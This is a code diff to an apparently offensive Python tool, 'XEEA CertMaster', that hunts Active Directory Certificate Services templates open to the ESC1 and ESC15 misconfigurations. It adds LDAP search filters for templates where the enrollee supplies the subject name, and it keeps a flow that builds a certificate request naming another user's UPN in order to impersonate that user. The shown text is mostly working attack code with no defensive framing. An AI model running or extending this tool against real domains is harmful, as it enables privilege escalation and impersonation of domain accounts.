@@ -21,7 +21,7 @@ BANNER = r"""
    \  /| |__  | |__  / _ \| | |   |  _| | |_) || | | |\/| | / _ \ \___ \ | | |  _| | |_) |
    /  \|  __| |  __|/ ___ \ | |___| |___|  _ < | | | |  | |/ ___ \ ___) || | | |___|  _ <
   /_/\_\____|_|____/_/   \_\_\____|_____|_| \_\|_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\
-                 PURE XEEA CERTMASTER - AD CS ESC1 HUNTER
+                 PURE XEEA CERTMASTER - AD CS ESC1/15 HUNTER
 """
 
 console = Console()
@@ -69,25 +69,37 @@ class XEEACertMaster:
         parts = self.domain.split('.')
         return ','.join([f'DC={p}' for p in parts])
 
-    def scan_esc1(self):
-        log.info(f"Scanning for ESC1 vulnerable templates in {self.domain}...")
+    def scan_esc_vulns(self):
+        log.info(f"Scanning for AD CS vulnerabilities (ESC1, ESC15) in {self.domain}...")
         server = Server(self.target, get_info=ALL)
         conn = Connection(server, user=f'{self.domain}\\{self.username}', password=self.password, authentication=NT_LM, auto_bind=True)
         
-        # Filter for Enrollee Supplies Subject (0x10000) and Client Authentication (1.3.6.1.5.5.7.3.2)
-        search_filter = "(&(objectCategory=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=65536)(pKIExtendedKeyUsage=1.3.6.1.5.5.7.3.2))"
         config_dn = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{self.base_dn}"
         
-        conn.search(config_dn, search_filter, attributes=['cn', 'displayName', 'msPKI-Certificate-Name-Flag', 'pKIExtendedKeyUsage'])
+        # --- ESC1 Scan ---
+        # Filter for Enrollee Supplies Subject (0x10000) AND Client Authentication EKU
+        esc1_filter = "(&(objectCategory=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=65536)(pKIExtendedKeyUsage=1.3.6.1.5.5.7.3.2))"
+        conn.search(config_dn, esc1_filter, attributes=['cn', 'displayName'])
         
-        templates = []
         for entry in conn.entries:
-            log.warning(f"Found Potential ESC1 Template: [bold yellow]{entry.cn}[/bold yellow]")
-            templates.append(str(entry.cn))
+            log.warning(f"Found [bold red]ESC1[/bold red] Template: [bold yellow]{entry.cn}[/bold yellow]")
+
+        # --- ESC15 Scan ---
+        # Schema Version 1 (msPKI-Template-Schema-Version=1) AND Enrollee Supplies Subject (0x10000)
+        # Note: ESC15 often targets templates without Domain Auth EKUs, but the core vulnerability is Schema 1 + SAN.
+        esc15_filter = "(&(objectCategory=pKICertificateTemplate)(msPKI-Template-Schema-Version=1)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=65536))"
+        conn.search(config_dn, esc15_filter, attributes=['cn', 'msPKI-Template-Schema-Version', 'pKIExtendedKeyUsage'])
         
-        if not templates:
-            log.info("[-] No vulnerable templates found.")
-        return templates
+        for entry in conn.entries:
+            # If it doesn't have Client Auth, it's a "Pure" ESC15 (impersonation via lack of EKU checks)
+            ekus = entry.pKIExtendedKeyUsage.values if 'pKIExtendedKeyUsage' in entry else []
+            if '1.3.6.1.5.5.7.3.2' not in ekus:
+                log.warning(f"Found [bold magenta]ESC15[/bold magenta] Template: [bold yellow]{entry.cn}[/bold yellow] (Schema 1 + SAN, No Client Auth)")
+            else:
+                log.warning(f"Found [bold magenta]ESC15[/bold magenta] Template: [bold yellow]{entry.cn}[/bold yellow] (Schema 1 + SAN, Has Client Auth/ESC1 overlap)")
+
+        if not conn.entries:
+            log.info("[-] No clearly vulnerable templates found.")
 
     def generate_csr(self, common_name, alt_upn):
         log.info(f"Generating RSA Key and CSR for {common_name} (SAN: {alt_upn})...")
@@ -151,7 +163,7 @@ if __name__ == "__main__":
     master = XEEACertMaster(args.target, args.username, args.password, args.domain, args.hashes)
 
     if args.scan:
-        master.scan_esc1()
+        master.scan_esc_vulns()
 
     if args.template and args.alt_user:
         csr = master.generate_csr(args.username, args.alt_user)
